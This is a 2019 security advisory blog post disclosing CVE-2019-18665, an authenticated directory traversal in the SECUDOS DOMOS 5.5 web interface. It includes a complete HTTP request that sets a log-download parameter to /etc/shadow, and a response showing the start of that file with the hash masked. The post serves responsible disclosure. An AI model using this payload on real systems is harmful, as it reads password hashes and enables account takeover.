---
layout: post
title: "CVE-2019-18665: Directory Traversal in DOMOS"
date:   2019-11-01 14:00:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Overview

- Vendor: SECUDOS GmbH
- Product: DOMOS
- Version: 5.5
- Vulnerability: Directory Traversal
- Fixed Version: 5.6

# Background

DOMOS is an own and hardened operating system of SCUDOS GmbH. The operating system is used as a platform by several applications. It also offers a web interface for the administration of operating system settings.

# Issue Description

While analyzing the implementation of the DOMOS web interface, one directory traversal vulnerability has been identified, which can be exploited in order to read session_id´s from other registered users and this can lead to a session hijacking of those users. This vulnerability can be exploited by authenticated attackers with access to the web interface.

Please consider the following complete HTTP-Request:

__HTTP-Request__

~~~ http
GET /page/sl_logdl?dcfct=DCMlog.download_log&dbkey%3Asyslog.rlog=/etc/shadow HTTP/1.1

Host: 10.10.10.1:10000
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
(KHTML, like Gecko) Falkon/3.0.1 Chrome/69.0.3497.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,
image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.8
Cookie: L=german; S=WdylJWgYQfqXVu1VkvBP9pwxBdh91bhDWB87eB5h;
session_id=09bced960d7c7bb0cc15d28c7128b5bc86e7c611
~~~

The following HTTP response include the password hashes from the /etc/shadow:

__HTTP-Request__

~~~ http
HTTP/1.1 200 OK

Server: nginx/1.9.14
Date: Thu, 24 Jan 2019 11:48:50 GMT
Content-Type: application/data
Content-Length: 870
Connection: close
Last-Modified: Thu, 24 Jan 2019 11:48:50 GMT
Content-Disposition: shadow; filename="shadow"
Set-Cookie: session_id=09bced960d7c7bb0cc15d28c7128b5bc86e7c611;
expires=Fri, 25 Jan 2019 04:27:50 GMT; httponly; Path=/; secure
Strict-Transport-Security: max-age=15768000
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Permitted-Cross-Domain-Policies: master-only

root:$1$xxxxxxxxxxx:17919:0:99999:7:::
bin:*:17632:0:99999:7:::
daemon:*:17632:0:99999:7:::
...[SNIP]...
~~~

# CVE

[CVE-2019-18665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18665)

# CVSSv3 Base Score

CVSS Base Score: __6.5__

CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N

# Credit

Pascal Keul of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Patrick Muench of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Torsten Löbner of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
